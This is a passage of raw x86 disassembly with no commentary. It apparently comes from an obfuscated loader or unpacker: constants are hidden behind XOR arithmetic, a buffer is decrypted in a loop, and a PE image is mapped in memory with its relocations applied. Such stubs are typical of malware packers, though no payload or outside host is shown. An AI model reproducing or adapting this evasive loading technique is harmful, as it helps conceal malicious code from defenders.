  419f9e:	add    ecx,esi
  419fa0:	push   ecx
  419fa1:	call   DWORD PTR [eax+0x14]
  419fa4:	mov    edi,eax
  419fa6:	mov    eax,DWORD PTR [ebp+0x8]
  419fa9:	mov    ecx,DWORD PTR [ebp-0x20]
  419fac:	mov    eax,DWORD PTR [eax+0x1d8]
  419fb2:	xor    ecx,ebx
  419fb4:	add    ecx,esi
  419fb6:	push   ecx
  419fb7:	mov    ecx,DWORD PTR [ebp-0x48]
  419fba:	xor    ecx,ebx
  419fbc:	add    ecx,esi
  419fbe:	push   ecx
  419fbf:	mov    ecx,DWORD PTR [ebp-0xc]
  419fc2:	push   DWORD PTR [ebp-0x10]
  419fc5:	xor    ecx,ebx
  419fc7:	add    ecx,esi
  419fc9:	push   ecx
  419fca:	call   DWORD PTR [eax+0x14]
  419fcd:	mov    ecx,DWORD PTR [ebp-0xc]
  419fd0:	xor    ecx,ebx
  419fd2:	add    ecx,esi
  419fd4:	mov    DWORD PTR [ebp-0x20],eax
  419fd7:	cmp    ecx,edi
  419fd9:	je     0x41a366
  419fdf:	mov    ecx,DWORD PTR [ebp-0xc]
  419fe2:	xor    ecx,ebx
  419fe4:	add    ecx,esi
  419fe6:	cmp    ecx,eax
  419fe8:	je     0x41a366
  419fee:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  419ff5:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  419ffc:	mov    ecx,DWORD PTR [ebp-0x3c]
  419fff:	xor    cl,0x99
  41a002:	sub    cl,0x20
  41a005:	mov    BYTE PTR [edi],cl
  41a007:	mov    ecx,DWORD PTR [ebp-0xc]
  41a00a:	xor    cl,0x99
  41a00d:	sub    cl,0x20
  41a010:	mov    BYTE PTR [edi+0x1],cl
  41a013:	mov    ecx,DWORD PTR [ebp-0x4c]
  41a016:	xor    cl,0x99
  41a019:	sub    cl,0x20
  41a01c:	mov    BYTE PTR [edi+0x2],cl
  41a01f:	and    DWORD PTR [ebp-0xb4],0x0
  41a026:	and    DWORD PTR [ebp-0xa4],0x0
  41a02d:	lea    ecx,[ebp-0xa4]
  41a033:	push   ecx
  41a034:	push   DWORD PTR [ebp-0x10]
  41a037:	push   eax
  41a038:	lea    eax,[ebp-0xb4]
  41a03e:	push   eax
  41a03f:	mov    eax,DWORD PTR [ebp-0x2c]
  41a042:	push   DWORD PTR [eax+0xc]
  41a045:	mov    eax,DWORD PTR [ebp-0x28]
  41a048:	add    eax,0x10
  41a04b:	push   eax
  41a04c:	push   edi
  41a04d:	call   0x419399
  41a052:	mov    DWORD PTR [ebp-0x3c],eax
  41a055:	mov    eax,DWORD PTR [ebp+0x8]
  41a058:	mov    ecx,DWORD PTR [ebp-0x50]
  41a05b:	mov    eax,DWORD PTR [eax+0x1d8]
  41a061:	xor    ecx,ebx
  41a063:	add    ecx,esi
  41a065:	push   ecx
  41a066:	mov    ecx,DWORD PTR [ebp-0xc]
  41a069:	xor    ecx,ebx
  41a06b:	add    ecx,esi
  41a06d:	push   ecx
  41a06e:	push   edi
  41a06f:	call   DWORD PTR [eax+0x18]
  41a072:	mov    eax,DWORD PTR [ebp-0x3c]
  41a075:	add    eax,0xffcd8d20
  41a07a:	xor    eax,ebx
  41a07c:	cmp    eax,0xf89c85b9
  41a081:	mov    eax,DWORD PTR [ebp+0x8]
  41a084:	mov    eax,DWORD PTR [eax+0x1d8]
  41a08a:	mov    ecx,DWORD PTR [ebp-0x50]
  41a08d:	jne    0x41a0b0
  41a08f:	xor    ecx,ebx
  41a091:	add    ecx,esi
  41a093:	push   ecx
  41a094:	mov    ecx,DWORD PTR [ebp-0xc]
  41a097:	xor    ecx,ebx
  41a099:	add    ecx,esi
  41a09b:	push   ecx
  41a09c:	push   DWORD PTR [ebp-0x28]
  41a09f:	call   DWORD PTR [eax+0x18]
  41a0a2:	mov    eax,DWORD PTR [ebp-0x20]
  41a0a5:	mov    DWORD PTR [ebp-0x28],eax
  41a0a8:	mov    eax,DWORD PTR [ebp-0x10]
  41a0ab:	mov    DWORD PTR [ebp-0x40],eax
  41a0ae:	jmp    0x41a0c3
  41a0b0:	xor    ecx,ebx
  41a0b2:	add    ecx,esi
  41a0b4:	push   ecx
  41a0b5:	mov    ecx,DWORD PTR [ebp-0xc]
  41a0b8:	xor    ecx,ebx
  41a0ba:	add    ecx,esi
  41a0bc:	push   ecx
  41a0bd:	push   DWORD PTR [ebp-0x20]
  41a0c0:	call   DWORD PTR [eax+0x18]
  41a0c3:	mov    eax,DWORD PTR [ebp-0x40]
  41a0c6:	mov    DWORD PTR [ebp-0x38],eax
  41a0c9:	mov    eax,DWORD PTR [ebp-0x28]
  41a0cc:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41a0d3:	mov    DWORD PTR [ebp-0x3c],eax
  41a0d6:	mov    edi,0xf89c85b8
  41a0db:	mov    DWORD PTR [ebp-0x30],edi
  41a0de:	mov    eax,DWORD PTR [ebp-0x24]
  41a0e1:	xor    eax,ebx
  41a0e3:	add    eax,esi
  41a0e5:	mov    DWORD PTR [ebp-0xc],eax
  41a0e8:	mov    eax,DWORD PTR [ebp-0x24]
  41a0eb:	xor    eax,ebx
  41a0ed:	add    eax,esi
  41a0ef:	mov    DWORD PTR [ebp-0x10],eax
  41a0f2:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41a0f9:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  41a100:	mov    eax,DWORD PTR [ebp-0x24]
  41a103:	mov    ecx,DWORD PTR [ebp-0x38]
  41a106:	xor    eax,ebx
  41a108:	add    eax,esi
  41a10a:	cmp    ecx,eax
  41a10c:	je     0x41a302
  41a112:	jmp    0x41a2de
  41a117:	mov    ecx,DWORD PTR [ebp-0xc]
  41a11a:	mov    eax,DWORD PTR [ebp-0x38]
  41a11d:	sub    eax,ecx
  41a11f:	mov    ecx,DWORD PTR [ebp-0x48]
  41a122:	xor    ecx,ebx
  41a124:	add    ecx,esi
  41a126:	xor    edx,edx
  41a128:	div    ecx
  41a12a:	mov    DWORD PTR [ebp-0x10],eax
  41a12d:	mov    eax,DWORD PTR [ebp-0x20]
  41a130:	mov    ecx,DWORD PTR [ebp-0x10]
  41a133:	xor    eax,ebx
  41a135:	add    eax,esi
  41a137:	cmp    ecx,eax
  41a139:	jbe    0x41a145
  41a13b:	mov    eax,DWORD PTR [ebp-0x20]
  41a13e:	xor    eax,ebx
  41a140:	add    eax,esi
  41a142:	mov    DWORD PTR [ebp-0x10],eax
  41a145:	mov    eax,DWORD PTR [ebp-0x48]
  41a148:	mov    ecx,DWORD PTR [ebp-0x10]
  41a14b:	xor    eax,ebx
  41a14d:	add    eax,esi
  41a14f:	imul   eax,ecx
  41a152:	mov    DWORD PTR [ebp-0x10],eax
  41a155:	mov    eax,DWORD PTR [ebp-0x24]
  41a158:	mov    ecx,DWORD PTR [ebp-0x10]
  41a15b:	xor    eax,ebx
  41a15d:	add    eax,esi
  41a15f:	cmp    ecx,eax
  41a161:	je     0x41a2cc
  41a167:	mov    eax,DWORD PTR [ebp-0x10]
  41a16a:	mov    DWORD PTR [ebp-0x34],eax
  41a16d:	mov    eax,DWORD PTR [ebp-0xc]
  41a170:	add    eax,DWORD PTR [ebp-0x3c]
  41a173:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  41a17a:	mov    DWORD PTR [ebp-0x10],edi
  41a17d:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41a184:	mov    DWORD PTR [ebp-0x1c],eax
  41a187:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41a18e:	mov    DWORD PTR [ebp-0x8],edi
  41a191:	mov    eax,DWORD PTR [ebp-0x54]
  41a194:	xor    eax,ebx
  41a196:	add    eax,esi
  41a198:	jmp    0x41a28b
  41a19d:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41a1a7:	mov    DWORD PTR [ebp-0x9c],0xf89c85ad
  41a1b1:	mov    eax,DWORD PTR [ebp-0x8]
  41a1b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41a1b7:	xor    eax,ebx
  41a1b9:	add    eax,esi
  41a1bb:	imul   eax,ecx
  41a1be:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a1c1:	mov    al,BYTE PTR [eax+ecx*1]
  41a1c4:	mov    BYTE PTR [ebp-0x1],al
  41a1c7:	mov    eax,DWORD PTR [ebp-0x8]
  41a1ca:	mov    ecx,DWORD PTR [ebp-0x18]
  41a1cd:	xor    eax,ebx
  41a1cf:	add    eax,esi
  41a1d1:	imul   eax,ecx
  41a1d4:	mov    ecx,DWORD PTR [ebp-0x4c]
  41a1d7:	xor    ecx,ebx
  41a1d9:	add    eax,ecx
  41a1db:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a1de:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41a1e6:	mov    ecx,DWORD PTR [ebp-0xac]
  41a1ec:	xor    ecx,ebx
  41a1ee:	lea    eax,[ecx+eax*1+0x3272e0]
  41a1f5:	movzx  ecx,BYTE PTR [ebp-0x1]
  41a1f9:	xor    ecx,eax
  41a1fb:	mov    BYTE PTR [ebp-0x1],cl
  41a1fe:	mov    al,BYTE PTR [ebp-0x1]
  41a201:	mov    ecx,DWORD PTR [ebp-0x8]
  41a204:	mov    edx,DWORD PTR [ebp-0x18]
  41a207:	xor    ecx,ebx
  41a209:	add    ecx,esi
  41a20b:	imul   ecx,edx
  41a20e:	mov    edx,DWORD PTR [ebp-0x1c]
  41a211:	mov    BYTE PTR [ecx+edx*1],al
  41a214:	mov    eax,DWORD PTR [ebp-0x8]
  41a217:	mov    ecx,DWORD PTR [ebp-0x18]
  41a21a:	xor    eax,ebx
  41a21c:	add    eax,esi
  41a21e:	imul   eax,ecx
  41a221:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a224:	mov    al,BYTE PTR [eax+ecx*1]
  41a227:	mov    BYTE PTR [ebp-0x1],al
  41a22a:	mov    eax,DWORD PTR [ebp-0x8]
  41a22d:	mov    ecx,DWORD PTR [ebp-0x18]
  41a230:	xor    eax,ebx
  41a232:	add    eax,esi
  41a234:	imul   eax,ecx
  41a237:	mov    ecx,DWORD PTR [ebp-0x10]
  41a23a:	xor    ecx,ebx
  41a23c:	add    eax,ecx
  41a23e:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a241:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41a249:	mov    ecx,DWORD PTR [ebp-0x9c]
  41a24f:	xor    ecx,ebx
  41a251:	lea    eax,[ecx+eax*1+0x3272e0]
  41a258:	movzx  ecx,BYTE PTR [ebp-0x1]
  41a25c:	xor    ecx,eax
  41a25e:	mov    BYTE PTR [ebp-0x1],cl
  41a261:	mov    al,BYTE PTR [ebp-0x1]
  41a264:	mov    ecx,DWORD PTR [ebp-0x8]
  41a267:	mov    edx,DWORD PTR [ebp-0x18]
  41a26a:	xor    ecx,ebx
  41a26c:	add    ecx,esi
  41a26e:	imul   ecx,edx
  41a271:	mov    edx,DWORD PTR [ebp-0x1c]
  41a274:	mov    BYTE PTR [ecx+edx*1],al
  41a277:	mov    eax,DWORD PTR [ebp-0x2c]
  41a27a:	mov    ecx,DWORD PTR [ebp-0x10]
  41a27d:	xor    eax,ebx
  41a27f:	xor    ecx,ebx
  41a281:	add    eax,esi
  41a283:	add    ecx,esi
  41a285:	imul   eax,ecx
  41a288:	add    eax,DWORD PTR [ebp-0x18]
  41a28b:	mov    DWORD PTR [ebp-0x18],eax
  41a28e:	mov    eax,DWORD PTR [ebp-0x18]
  41a291:	mov    ecx,DWORD PTR [ebp-0x34]
  41a294:	cmp    ecx,eax
  41a296:	jb     0x41a19d
  41a29c:	mov    eax,DWORD PTR [ebp-0x10]
  41a29f:	mov    ecx,DWORD PTR [ebp-0x34]
  41a2a2:	xor    eax,ebx
  41a2a4:	add    eax,esi
  41a2a6:	imul   eax,ecx
  41a2a9:	mov    ecx,DWORD PTR [ebp-0x54]
  41a2ac:	xor    ecx,ebx
  41a2ae:	add    ecx,esi
  41a2b0:	or     eax,ecx
  41a2b2:	mov    ecx,DWORD PTR [ebp-0x30]
  41a2b5:	xor    ecx,ebx
  41a2b7:	add    eax,ecx
  41a2b9:	mov    ecx,DWORD PTR [ebp-0x30]
  41a2bc:	xor    ecx,ebx
  41a2be:	add    eax,ecx
  41a2c0:	mov    ecx,DWORD PTR [ebp-0xc]
  41a2c3:	lea    eax,[eax+ecx*1+0x64e5c0]
  41a2ca:	jmp    0x41a2db
  41a2cc:	mov    eax,DWORD PTR [ebp-0x30]
  41a2cf:	mov    ecx,DWORD PTR [ebp-0xc]
  41a2d2:	xor    eax,ebx
  41a2d4:	lea    eax,[eax+ecx*1+0x3272e0]
  41a2db:	mov    DWORD PTR [ebp-0xc],eax
  41a2de:	mov    eax,DWORD PTR [ebp-0x30]
  41a2e1:	xor    eax,ebx
  41a2e3:	mov    ecx,0xffcd8d20
  41a2e8:	sub    ecx,eax
  41a2ea:	add    ecx,DWORD PTR [ebp-0x38]
  41a2ed:	mov    eax,DWORD PTR [ebp-0x30]
  41a2f0:	mov    edx,DWORD PTR [ebp-0xc]
  41a2f3:	xor    eax,ebx
  41a2f5:	add    eax,esi
  41a2f7:	imul   eax,edx
  41a2fa:	cmp    eax,ecx
  41a2fc:	jbe    0x41a117
  41a302:	push   DWORD PTR [ebp+0x8]
  41a305:	mov    eax,DWORD PTR [ebp+0x8]
  41a308:	push   DWORD PTR [eax+0x1cc]
  41a30e:	lea    eax,[ebp-0xa0]
  41a314:	push   eax
  41a315:	mov    eax,DWORD PTR [ebp+0x8]
  41a318:	mov    eax,DWORD PTR [eax+0x1c4]
  41a31e:	push   DWORD PTR [eax]
  41a320:	mov    eax,DWORD PTR [ebp+0x8]
  41a323:	mov    eax,DWORD PTR [eax+0x1c0]
  41a329:	push   DWORD PTR [eax]
  41a32b:	push   DWORD PTR [ebp-0x40]
  41a32e:	push   DWORD PTR [ebp-0x28]
  41a331:	call   0x41ae07
  41a336:	mov    DWORD PTR [ebp-0x3c],eax
  41a339:	mov    eax,DWORD PTR [ebp-0x14]
  41a33c:	mov    ecx,DWORD PTR [ebp-0x28]
  41a33f:	xor    eax,ebx
  41a341:	add    eax,esi
  41a343:	cmp    eax,ecx
  41a345:	je     0x41a366
  41a347:	mov    eax,DWORD PTR [ebp+0x8]
  41a34a:	mov    ecx,DWORD PTR [ebp-0x50]
  41a34d:	mov    eax,DWORD PTR [eax+0x1d8]
  41a353:	xor    ecx,ebx
  41a355:	add    ecx,esi
  41a357:	push   ecx
  41a358:	mov    ecx,DWORD PTR [ebp-0x14]
  41a35b:	xor    ecx,ebx
  41a35d:	add    ecx,esi
  41a35f:	push   ecx
  41a360:	push   DWORD PTR [ebp-0x28]
  41a363:	call   DWORD PTR [eax+0x18]
  41a366:	pop    edi
  41a367:	pop    esi
  41a368:	pop    ebx
  41a369:	leave  
  41a36a:	ret    0x4
  41a36d:	push   ebp
  41a36e:	mov    ebp,esp
  41a370:	push   ecx
  41a371:	push   ecx
  41a372:	lea    eax,[ebp-0x8]
  41a375:	mov    DWORD PTR [ebp-0x4],eax
  41a378:	push   esi
  41a379:	mov    esi,DWORD PTR [ebp-0x4]
  41a37c:	mov    eax,0xf881ba0f
  41a381:	mov    DWORD PTR [esi],eax
  41a383:	mov    esi,DWORD PTR [ebp-0x8]
  41a386:	cmp    esi,eax
  41a388:	pop    esi
  41a389:	jne    0x41a393
  41a38b:	mov    BYTE PTR [ecx+0xa],0x7a
  41a38f:	mov    BYTE PTR [edx+0x8],0x2f
  41a393:	mov    BYTE PTR [edx+0xa],0x7a
  41a397:	mov    BYTE PTR [ecx+0x2],0x4
  41a39b:	leave  
  41a39c:	ret    
  41a39d:	push   ebp
  41a39e:	mov    ebp,esp
  41a3a0:	push   ecx
  41a3a1:	push   ecx
  41a3a2:	lea    eax,[ebp-0x8]
  41a3a5:	mov    DWORD PTR [ebp-0x4],eax
  41a3a8:	mov    edx,DWORD PTR [ebp-0x4]
  41a3ab:	mov    eax,0xf88b0be3
  41a3b0:	mov    DWORD PTR [edx],eax
  41a3b2:	mov    edx,DWORD PTR [ebp-0x8]
  41a3b5:	cmp    edx,eax
  41a3b7:	jne    0x41a3c8
  41a3b9:	mov    eax,DWORD PTR [ebp+0x8]
  41a3bc:	mov    BYTE PTR [ecx+0x9],0xe
  41a3c0:	mov    BYTE PTR [eax+0x7],0x47
  41a3c4:	mov    BYTE PTR [ecx+0x6],0xf
  41a3c8:	mov    BYTE PTR [ecx+0x3],0x1e
  41a3cc:	leave  
  41a3cd:	ret    0x4
  41a3d0:	push   ebp
  41a3d1:	mov    ebp,esp
  41a3d3:	push   ecx
  41a3d4:	push   ecx
  41a3d5:	lea    eax,[ebp-0x8]
  41a3d8:	mov    DWORD PTR [ebp-0x4],eax
  41a3db:	mov    edx,DWORD PTR [ebp-0x4]
  41a3de:	mov    eax,0x7e0da0f
  41a3e3:	mov    DWORD PTR [edx],eax
  41a3e5:	mov    edx,DWORD PTR [ebp-0x8]
  41a3e8:	cmp    edx,eax
  41a3ea:	jne    0x41a3f0
  41a3ec:	mov    BYTE PTR [ecx+0x7],0x47
  41a3f0:	mov    eax,DWORD PTR [ebp+0x8]
  41a3f3:	mov    BYTE PTR [ecx+0x1],0x1
  41a3f7:	mov    BYTE PTR [eax+0x9],0x2e
  41a3fb:	leave  
  41a3fc:	ret    0x4
  41a3ff:	push   ebp
  41a400:	mov    ebp,esp
  41a402:	push   ecx
  41a403:	push   ecx
  41a404:	lea    eax,[ebp-0x8]
  41a407:	mov    DWORD PTR [ebp-0x4],eax
  41a40a:	push   esi
  41a40b:	mov    esi,DWORD PTR [ebp-0x4]
  41a40e:	mov    eax,0x7060e3e
  41a413:	mov    DWORD PTR [esi],eax
  41a415:	mov    esi,DWORD PTR [ebp-0x8]
  41a418:	cmp    esi,eax
  41a41a:	pop    esi
  41a41b:	jne    0x41a427
  41a41d:	mov    BYTE PTR [edx+0x4],0xb
  41a421:	mov    WORD PTR [ecx+0x3],0xb1e
  41a427:	mov    BYTE PTR [edx],0x3f
  41a42a:	leave  
  41a42b:	ret    
  41a42c:	push   ebp
  41a42d:	mov    ebp,esp
  41a42f:	push   ecx
  41a430:	push   ecx
  41a431:	lea    eax,[ebp-0x8]
  41a434:	mov    DWORD PTR [ebp-0x4],eax
  41a437:	mov    edx,DWORD PTR [ebp-0x4]
  41a43a:	mov    eax,0xf8870b3f
  41a43f:	mov    DWORD PTR [edx],eax
  41a441:	mov    edx,DWORD PTR [ebp-0x8]
  41a444:	cmp    edx,eax
  41a446:	jne    0x41a453
  41a448:	mov    eax,DWORD PTR [ebp+0x8]
  41a44b:	mov    BYTE PTR [ecx+0x8],0xf
  41a44f:	mov    BYTE PTR [eax+0x1],0x1
  41a453:	mov    BYTE PTR [ecx+0x5],0xf3
  41a457:	leave  
  41a458:	ret    0x4
  41a45b:	push   esi
  41a45c:	mov    ecx,edi
  41a45e:	call   0x41a42c
  41a463:	mov    edx,edi
  41a465:	mov    ecx,esi
  41a467:	mov    BYTE PTR [esi],0x1f
  41a46a:	call   0x41a3ff
  41a46f:	push   esi
  41a470:	mov    ecx,edi
  41a472:	mov    BYTE PTR [esi+0x5],0xf3
  41a476:	call   0x41a3d0
  41a47b:	push   esi
  41a47c:	mov    BYTE PTR [esi+0x6],0xf
  41a480:	call   0x41a39d
  41a485:	mov    BYTE PTR [esi+0x2],0x4
  41a489:	mov    edx,esi
  41a48b:	jmp    0x41a36d
  41a490:	push   ebp
  41a491:	mov    ebp,esp
  41a493:	push   ecx
  41a494:	mov    ecx,DWORD PTR [edx+0x194]
  41a49a:	push   esi
  41a49b:	mov    esi,DWORD PTR [ebp+0x8]
  41a49e:	mov    esi,DWORD PTR [esi]
  41a4a0:	mov    DWORD PTR [ecx],esi
  41a4a2:	mov    ecx,DWORD PTR [edx+0x194]
  41a4a8:	mov    ecx,DWORD PTR [ecx]
  41a4aa:	mov    esi,DWORD PTR [edx+0x190]
  41a4b0:	mov    DWORD PTR [esi],ecx
  41a4b2:	mov    eax,DWORD PTR [edx+0x194]
  41a4b8:	mov    ecx,DWORD PTR [eax]
  41a4ba:	mov    ecx,DWORD PTR [ecx+0x3c]
  41a4bd:	add    ecx,DWORD PTR [eax]
  41a4bf:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  41a4c6:	mov    eax,DWORD PTR [ebp-0x4]
  41a4c9:	movzx  ecx,WORD PTR [ecx+0x16]
  41a4cd:	xor    eax,0x7510899
  41a4d2:	add    eax,0x3272e0
  41a4d7:	pop    esi
  41a4d8:	test   ecx,eax
  41a4da:	je     0x41a4e8
  41a4dc:	mov    eax,DWORD PTR [edx+0x1c8]
  41a4e2:	mov    DWORD PTR [eax],0xf89c85b8
  41a4e8:	leave  
  41a4e9:	ret    0x4
  41a4ec:	push   ebp
  41a4ed:	mov    ebp,esp
  41a4ef:	sub    esp,0x70
  41a4f2:	and    DWORD PTR [ebp-0x20],0x0
  41a4f6:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  41a4fd:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  41a504:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  41a50b:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41a512:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  41a519:	mov    eax,DWORD PTR [ebp+0x20]
  41a51c:	mov    eax,DWORD PTR [eax+0x194]
  41a522:	mov    DWORD PTR [ebp-0xc],eax
  41a525:	mov    eax,DWORD PTR [ebp+0x20]
  41a528:	push   ebx
  41a529:	push   esi
  41a52a:	mov    esi,DWORD PTR [eax+0x190]
  41a530:	mov    eax,DWORD PTR [ebp+0x20]
  41a533:	mov    eax,DWORD PTR [eax+0x18c]
  41a539:	mov    DWORD PTR [ebp-0x8],eax
  41a53c:	mov    eax,DWORD PTR [eax]
  41a53e:	push   edi
  41a53f:	mov    DWORD PTR [ebp-0x4],esi
  41a542:	test   eax,eax
  41a544:	jne    0x41a551
  41a546:	push   DWORD PTR [ebp+0x1c]
  41a549:	mov    edx,DWORD PTR [ebp+0x20]
  41a54c:	call   0x41a490
  41a551:	mov    eax,DWORD PTR [esi]
  41a553:	mov    ebx,DWORD PTR [esi]
  41a555:	add    ebx,DWORD PTR [eax+0x3c]
  41a558:	mov    eax,DWORD PTR [ebp+0xc]
  41a55b:	mov    ecx,DWORD PTR [ebp-0x8]
  41a55e:	mov    ecx,DWORD PTR [ecx]
  41a560:	mov    esi,0x7510899
  41a565:	xor    eax,esi
  41a567:	mov    edi,0x3272e0
  41a56c:	add    eax,edi
  41a56e:	cmp    eax,ecx
  41a570:	jne    0x41a7a8
  41a576:	mov    eax,DWORD PTR [ebp-0xc]
  41a579:	mov    eax,DWORD PTR [eax]
  41a57b:	mov    DWORD PTR [ebp-0x10],eax
  41a57e:	mov    eax,DWORD PTR [ebx+0x50]
  41a581:	mov    DWORD PTR [ebp-0x68],eax
  41a584:	mov    eax,DWORD PTR [ebp-0x18]
  41a587:	xor    eax,esi
  41a589:	add    eax,edi
  41a58b:	mov    DWORD PTR [ebp-0x64],eax
  41a58e:	mov    eax,DWORD PTR [ebp-0x14]
  41a591:	and    DWORD PTR [ebp-0x6c],0x0
  41a595:	xor    eax,esi
  41a597:	add    eax,edi
  41a599:	mov    DWORD PTR [ebp-0x60],eax
  41a59c:	lea    eax,[ebp-0x70]
  41a59f:	push   eax
  41a5a0:	mov    eax,DWORD PTR [ebp+0x8]
  41a5a3:	xor    eax,esi
  41a5a5:	add    eax,edi
  41a5a7:	push   eax
  41a5a8:	mov    eax,DWORD PTR [ebp+0x20]
  41a5ab:	add    eax,0xaa
  41a5b0:	push   eax
  41a5b1:	mov    eax,DWORD PTR [ebp+0x20]
  41a5b4:	mov    eax,DWORD PTR [eax+0x198]
  41a5ba:	mov    DWORD PTR [ebp-0x70],0x4
  41a5c1:	push   DWORD PTR [eax]
  41a5c3:	mov    eax,DWORD PTR [ebp+0x10]
  41a5c6:	call   eax
  41a5c8:	mov    ecx,DWORD PTR [ebp-0xc]
  41a5cb:	mov    ecx,DWORD PTR [ecx]
  41a5cd:	mov    edx,DWORD PTR [ebp-0x8]
  41a5d0:	mov    DWORD PTR [ebp-0x6c],eax
  41a5d3:	mov    DWORD PTR [ebp+0x1c],eax
  41a5d6:	mov    DWORD PTR [edx],ecx
  41a5d8:	mov    ecx,DWORD PTR [ebp-0x4]
  41a5db:	mov    DWORD PTR [ecx],eax
  41a5dd:	mov    eax,DWORD PTR [ebx+0x50]
  41a5e0:	mov    DWORD PTR [ebp-0x68],eax
  41a5e3:	mov    eax,DWORD PTR [ebp-0x1c]
  41a5e6:	xor    eax,esi
  41a5e8:	add    eax,edi
  41a5ea:	mov    DWORD PTR [ebp-0x64],eax
  41a5ed:	lea    eax,[ebp-0x20]
  41a5f0:	mov    DWORD PTR [ebp-0x60],eax
  41a5f3:	lea    eax,[ebp-0x70]
  41a5f6:	push   eax
  41a5f7:	mov    eax,DWORD PTR [ebp+0x8]
  41a5fa:	xor    eax,esi
  41a5fc:	add    eax,edi
  41a5fe:	push   eax
  41a5ff:	mov    eax,DWORD PTR [ebp+0x20]
  41a602:	add    eax,0xee
  41a607:	push   eax
  41a608:	mov    eax,DWORD PTR [ebp+0x20]
  41a60b:	mov    eax,DWORD PTR [eax+0x198]
  41a611:	mov    DWORD PTR [ebp-0x70],0x4
  41a618:	push   DWORD PTR [eax]
  41a61a:	mov    eax,DWORD PTR [ebp+0x10]
  41a61d:	call   eax
  41a61f:	test   eax,eax
  41a621:	je     0x41a646
  41a623:	and    DWORD PTR [ebp+0xc],0x0
  41a627:	cmp    DWORD PTR [ebx+0x50],0x0
  41a62b:	jbe    0x41a646
  41a62d:	mov    eax,DWORD PTR [ebp+0x1c]
  41a630:	mov    ecx,DWORD PTR [ebp-0x10]
  41a633:	sub    ecx,eax
  41a635:	mov    dl,BYTE PTR [ecx+eax*1]
  41a638:	inc    DWORD PTR [ebp+0xc]
  41a63b:	mov    BYTE PTR [eax],dl
  41a63d:	mov    edx,DWORD PTR [ebp+0xc]
  41a640:	inc    eax
  41a641:	cmp    edx,DWORD PTR [ebx+0x50]
  41a644:	jb     0x41a635
  41a646:	mov    edx,DWORD PTR [ebp+0x1c]
  41a649:	mov    ecx,DWORD PTR [edx+0x3c]
  41a64c:	add    ecx,edx
  41a64e:	mov    eax,DWORD PTR [ecx+0xa0]
  41a654:	mov    ebx,DWORD PTR [ecx+0x28]
  41a657:	add    eax,edx
  41a659:	sub    edx,DWORD PTR [ebp-0x10]
  41a65c:	add    ebx,DWORD PTR [ebp+0x1c]
  41a65f:	mov    DWORD PTR [ebp+0xc],edx
  41a662:	mov    DWORD PTR [ebp-0x2c],ecx
  41a665:	mov    DWORD PTR [ebp-0x14],ebx
  41a668:	mov    DWORD PTR [ebp-0x8],0x0
  41a66f:	jmp    0x41a6eb
  41a671:	add    edx,0xfffffff8
  41a674:	shr    edx,1
  41a676:	mov    DWORD PTR [ebp-0x18],edx
  41a679:	je     0x41a6d7
  41a67b:	lea    edx,[eax+0x8]
  41a67e:	mov    DWORD PTR [ebp-0x4],edx
  41a681:	mov    edx,DWORD PTR [ebp-0x18]
  41a684:	mov    DWORD PTR [ebp-0x18],edx
  41a687:	mov    edx,DWORD PTR [ebp-0x4]
  41a68a:	movzx  edx,WORD PTR [edx]
  41a68d:	mov    DWORD PTR [ebp-0x24],edx
  41a690:	and    edx,0xfff
  41a696:	mov    DWORD PTR [ebp-0x28],edx
  41a699:	mov    edx,DWORD PTR [ebp-0x24]
  41a69c:	shr    edx,0xc
  41a69f:	add    edx,0xffcd8d20
  41a6a5:	xor    edx,esi
  41a6a7:	cmp    edx,0xf89c85ba
  41a6ad:	jne    0x41a6ce
  41a6af:	mov    edx,DWORD PTR [ebp-0x28]
  41a6b2:	add    edx,DWORD PTR [ebp+0x1c]
  41a6b5:	mov    ebx,DWORD PTR [eax]
  41a6b7:	cmp    DWORD PTR [ebx+edx*1],0x0
  41a6bb:	je     0x41a6cb
  41a6bd:	mov    ecx,DWORD PTR [ebp+0xc]
  41a6c0:	add    ecx,DWORD PTR [ebx+edx*1]
  41a6c3:	mov    ebx,DWORD PTR [eax]
  41a6c5:	mov    DWORD PTR [edx+ebx*1],ecx
  41a6c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41a6cb:	mov    ebx,DWORD PTR [ebp-0x14]
  41a6ce:	add    DWORD PTR [ebp-0x4],0x2
  41a6d2:	dec    DWORD PTR [ebp-0x18]
  41a6d5:	jne    0x41a687
  41a6d7:	mov    edx,DWORD PTR [ebp-0xc]
  41a6da:	add    DWORD PTR [ebp-0x8],edx
  41a6dd:	mov    edx,DWORD PTR [ebp-0x8]
  41a6e0:	cmp    edx,DWORD PTR [ecx+0xa4]
  41a6e6:	jae    0x41a6f9
  41a6e8:	add    eax,DWORD PTR [ebp-0xc]
  41a6eb:	mov    edx,DWORD PTR [eax+0x4]
  41a6ee:	mov    DWORD PTR [ebp-0xc],edx
  41a6f1:	test   edx,edx
  41a6f3:	jne    0x41a671
  41a6f9:	mov    eax,DWORD PTR [ebp-0x10]
  41a6fc:	mov    DWORD PTR [ebp-0x6c],eax
  41a6ff:	mov    DWORD PTR [ebp-0x70],0x4
  41a706:	mov    eax,DWORD PTR [ecx+0x50]
  41a709:	mov    DWORD PTR [ebp-0x68],eax
  41a70c:	mov    eax,DWORD PTR [ebp-0x1c]
  41a70f:	xor    eax,esi
  41a711:	add    eax,edi
  41a713:	mov    DWORD PTR [ebp-0x64],eax
  41a716:	lea    eax,[ebp-0x20]
  41a719:	mov    DWORD PTR [ebp-0x60],eax
